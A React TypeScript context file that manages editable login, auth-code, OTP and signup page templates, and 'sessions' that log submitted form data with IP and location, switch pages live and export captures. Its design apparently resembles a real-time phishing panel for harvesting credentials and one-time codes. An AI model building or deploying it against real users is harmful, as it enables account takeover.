
import React, { createContext, useContext, useState, useEffect } from 'react';

// Page type definitions
interface SubPage {
  id: string;
  name: string;
  description: string;
  fields: string[];
  html: string;
  parentId: string;
}

interface MainPage {
  id: string;
  name: string;
  description: string;
  subPages: SubPage[];
}

interface SessionData {
  timestamp: string;
  ip: string;
  location: string;
  formData: Record<string, string>;
}

interface Session {
  id: string;
  mainPageId: string;
  currentSubPageId: string;
  pageType?: string; // Added pageType property
  createdAt: string;
  data: SessionData[];
  active: boolean;
  hasNewData: boolean;
}

interface SessionContextType {
  sessions: Session[];
  mainPages: MainPage[];
  addSession: (mainPageId: string, subPageId: string) => void;
  addSessionData: (sessionId: string, data: SessionData) => void;
  switchSubPage: (sessionId: string, newSubPageId: string) => void;
  exportSessionData: (sessionId: string) => void;
  getSessionById: (sessionId: string) => Session | undefined;
  getMainPageById: (mainPageId: string) => MainPage | undefined;
  getSubPageById: (mainPageId: string, subPageId: string) => SubPage | undefined;
  closeSession: (sessionId: string) => void;
  resetNewDataFlag: (sessionId: string) => void;
  updateMainPage: (updatedPage: MainPage) => void;
  updateSubPage: (mainPageId: string, updatedSubPage: SubPage) => void;
  addMainPage: (newPage: Omit<MainPage, 'id'>) => string;
  addSubPage: (mainPageId: string, newSubPage: Omit<SubPage, 'id' | 'parentId'>) => string;
  deleteMainPage: (mainPageId: string) => void;
  deleteSubPage: (mainPageId: string, subPageId: string) => void;
}

const SessionContext = createContext<SessionContextType | undefined>(undefined);

export const useSessionContext = (): SessionContextType => {
  const context = useContext(SessionContext);
  if (!context) {
    throw new Error('useSessionContext must be used within a SessionProvider');
  }
  return context;
};

export const SessionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // Initial predefined main pages and subpages
  const initialMainPages: MainPage[] = [
    {
      id: 'login',
      name: 'Authentication Pages',
      description: 'Various authentication page templates',
      subPages: [
        {
          id: 'login1',
          name: 'Email & Password Login',
          description: 'Standard email and password login form',
          fields: ['email', 'password'],
          html: `<div class="p-6">
            <h1 class="text-2xl font-bold mb-4">Login</h1>
            <div class="mb-4">
              <label class="block mb-2">Email</label>
              <input type="email" class="w-full p-2 border rounded" />
            </div>
            <div class="mb-4">
              <label class="block mb-2">Password</label>
              <input type="password" class="w-full p-2 border rounded" />
            </div>
            <button class="bg-purple-600 text-white px-4 py-2 rounded">Submit</button>
          </div>`,
          parentId: 'login'
        },
        {
          id: 'login2',
          name: 'Authentication Code',
          description: 'Single auth code input form',
          fields: ['auth_code'],
          html: `<div class="p-6">
            <h1 class="text-2xl font-bold mb-4">Enter Authentication Code</h1>
            <div class="mb-4">
              <label class="block mb-2">Auth Code</label>
              <input type="text" class="w-full p-2 border rounded" />
            </div>
            <button class="bg-purple-600 text-white px-4 py-2 rounded">Submit</button>
          </div>`,
          parentId: 'login'
        },
        {
          id: 'login3',
          name: 'OTP Verification',
          description: 'One-time password verification form',
          fields: ['otp'],
          html: `<div class="p-6">
            <h1 class="text-2xl font-bold mb-4">OTP Verification</h1>
            <div class="mb-4">
              <label class="block mb-2">Enter One-Time Password</label>
              <input type="text" class="w-full p-2 border rounded" />
            </div>
            <button class="bg-purple-600 text-white px-4 py-2 rounded">Verify</button>
          </div>`,
          parentId: 'login'
        },
        {
          id: 'login4',
          name: 'Social Login',
          description: 'Social media login options',
          fields: ['provider'],
          html: `<div class="p-6">
            <h1 class="text-2xl font-bold mb-4">Login with Social Media</h1>
            <div class="flex flex-col gap-4">
              <button class="bg-blue-600 text-white px-4 py-2 rounded">Login with Facebook</button>
              <button class="bg-cyan-500 text-white px-4 py-2 rounded">Login with Twitter</button>
              <button class="bg-red-500 text-white px-4 py-2 rounded">Login with Google</button>
            </div>
          </div>`,
          parentId: 'login'
        }
      ]
    },
    {
      id: 'signup',
      name: 'Registration Pages',
      description: 'User registration templates',
      subPages: [
        {
          id: 'signup1',
          name: 'Basic Registration',
          description: 'Standard registration form',
          fields: ['name', 'email', 'password', 'confirm_password'],
          html: `<div class="p-6">
            <h1 class="text-2xl font-bold mb-4">Create Account</h1>
            <div class="mb-4">
              <label class="block mb-2">Full Name</label>
              <input type="text" class="w-full p-2 border rounded" />
            </div>
            <div class="mb-4">
              <label class="block mb-2">Email</label>
              <input type="email" class="w-full p-2 border rounded" />
            </div>
            <div class="mb-4">
              <label class="block mb-2">Password</label>
              <input type="password" class="w-full p-2 border rounded" />
            </div>
            <div class="mb-4">
              <label class="block mb-2">Confirm Password</label>
              <input type="password" class="w-full p-2 border rounded" />
            </div>
            <button class="bg-purple-600 text-white px-4 py-2 rounded">Register</button>
          </div>`,
          parentId: 'signup'
        },
        {
          id: 'signup2',
          name: 'Newsletter Signup',
          description: 'Email newsletter registration',
          fields: ['email'],
          html: `<div class="p-6">
            <h1 class="text-2xl font-bold mb-4">Join Our Newsletter</h1>
            <div class="mb-4">
              <label class="block mb-2">Email Address</label>
              <input type="email" class="w-full p-2 border rounded" />
            </div>
            <button class="bg-purple-600 text-white px-4 py-2 rounded">Subscribe</button>
          </div>`,
          parentId: 'signup'
        }
      ]
    }
  ];
  
  const [mainPages, setMainPages] = useState<MainPage[]>(() => {
    const savedMainPages = localStorage.getItem('mainPages');
    return savedMainPages ? JSON.parse(savedMainPages) : initialMainPages;
  });

  const [sessions, setSessions] = useState<Session[]>(() => {
    const savedSessions = localStorage.getItem('sessions');
    if (savedSessions) {
      return JSON.parse(savedSessions);
    }
    
    // Default session with the new structure
    const defaultPage = initialMainPages[0];
    const defaultSubPage = defaultPage.subPages[0];
    
    return [
      {
        id: 'demo123',
        mainPageId: defaultPage.id,
        pageType: defaultPage.name, // Set pageType from main page name
        currentSubPageId: defaultSubPage.id,
        createdAt: new Date().toISOString(),
        data: [
          {
            timestamp: new Date().toISOString(),
            ip: '192.168.1.1',
            location: 'New York, USA',
            formData: { email: 'test@example.com', password: '********' }
          }
        ],
        active: true,
        hasNewData: true
      }
    ];
  });

  useEffect(() => {
    localStorage.setItem('sessions', JSON.stringify(sessions));
  }, [sessions]);
  
  useEffect(() => {
    localStorage.setItem('mainPages', JSON.stringify(mainPages));
  }, [mainPages]);

  const generateId = (): string => {
    return Math.random().toString(36).substring(2, 8);
  };
  
  const getMainPageById = (mainPageId: string) => {
    return mainPages.find(page => page.id === mainPageId);
  };
  
  const getSubPageById = (mainPageId: string, subPageId: string) => {
    const mainPage = getMainPageById(mainPageId);
    return mainPage?.subPages.find(subPage => subPage.id === subPageId);
  };

  const addSession = (mainPageId: string, subPageId: string) => {
    const mainPage = getMainPageById(mainPageId);
    const newSession: Session = {
      id: generateId(),
      mainPageId,
      pageType: mainPage?.name, // Set pageType from main page name
      currentSubPageId: subPageId,
      createdAt: new Date().toISOString(),
      data: [],
      active: true,
      hasNewData: false
    };
    setSessions([...sessions, newSession]);
    return newSession.id;
  };

  const addSessionData = (sessionId: string, data: SessionData) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          data: [...session.data, data],
          hasNewData: true
        };
      }
      return session;
    }));
  };

  const resetNewDataFlag = (sessionId: string) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          hasNewData: false
        };
      }
      return session;
    }));
  };

  const switchSubPage = (sessionId: string, newSubPageId: string) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          currentSubPageId: newSubPageId
        };
      }
      return session;
    }));
  };

  const closeSession = (sessionId: string) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          active: false
        };
      }
      return session;
    }));
  };

  const exportSessionData = (sessionId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (!session) return;
    
    const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
      JSON.stringify(session.data, null, 2)
    )}`;
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute('href', dataStr);
    downloadAnchorNode.setAttribute('download', `session_${sessionId}_data.json`);
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const getSessionById = (sessionId: string) => {
    return sessions.find(session => session.id === sessionId);
  };
  
  // Main page management
  const updateMainPage = (updatedPage: MainPage) => {
    setMainPages(mainPages.map(page => 
      page.id === updatedPage.id ? updatedPage : page
    ));
  };
  
  const addMainPage = (newPage: Omit<MainPage, 'id'>) => {
    const id = generateId();
    setMainPages([...mainPages, { ...newPage, id }]);
    return id;
  };
  
  const deleteMainPage = (mainPageId: string) => {
    setMainPages(mainPages.filter(page => page.id !== mainPageId));
    // Close any sessions using this main page
    setSessions(sessions.map(session => {
      if (session.mainPageId === mainPageId) {
        return { ...session, active: false };
      }
      return session;
    }));
  };
  
  // Sub page management
  const updateSubPage = (mainPageId: string, updatedSubPage: SubPage) => {
    setMainPages(mainPages.map(page => {
      if (page.id === mainPageId) {
        return {
          ...page,
          subPages: page.subPages.map(subPage => 
            subPage.id === updatedSubPage.id ? updatedSubPage : subPage
          )
        };
      }
      return page;
    }));
  };
  
  const addSubPage = (mainPageId: string, newSubPage: Omit<SubPage, 'id' | 'parentId'>) => {
    const id = generateId();
    setMainPages(mainPages.map(page => {
      if (page.id === mainPageId) {
        return {
          ...page,
          subPages: [...page.subPages, { ...newSubPage, id, parentId: mainPageId }]
        };
      }
      return page;
    }));
    return id;
  };
  
  const deleteSubPage = (mainPageId: string, subPageId: string) => {
    // First, ensure we're not deleting the last subpage
    const mainPage = mainPages.find(page => page.id === mainPageId);
    if (mainPage && mainPage.subPages.length <= 1) {
      // Cannot delete the last subpage
      return;
    }
    
    setMainPages(mainPages.map(page => {
      if (page.id === mainPageId) {
        return {
          ...page,
          subPages: page.subPages.filter(subPage => subPage.id !== subPageId)
        };
      }
      return page;
    }));
    
    // Update any sessions using this subpage to use another subpage
    setSessions(sessions.map(session => {
      if (session.mainPageId === mainPageId && session.currentSubPageId === subPageId) {
        const mainPage = mainPages.find(p => p.id === mainPageId);
        const alternativeSubPage = mainPage?.subPages.find(s => s.id !== subPageId);
        if (alternativeSubPage) {
          return { ...session, currentSubPageId: alternativeSubPage.id };
        }
      }
      return session;
    }));
  };

  return (
    <SessionContext.Provider
      value={{
        sessions: sessions.filter(session => session.active),
        mainPages,
        addSession,
        addSessionData,
        switchSubPage,
        exportSessionData,
        getSessionById,
        getMainPageById,
        getSubPageById,
        closeSession,
        resetNewDataFlag,
        updateMainPage,
        updateSubPage,
        addMainPage,
        addSubPage,
        deleteMainPage,
        deleteSubPage
      }}
    >
      {children}
    </SessionContext.Provider>
  );
};
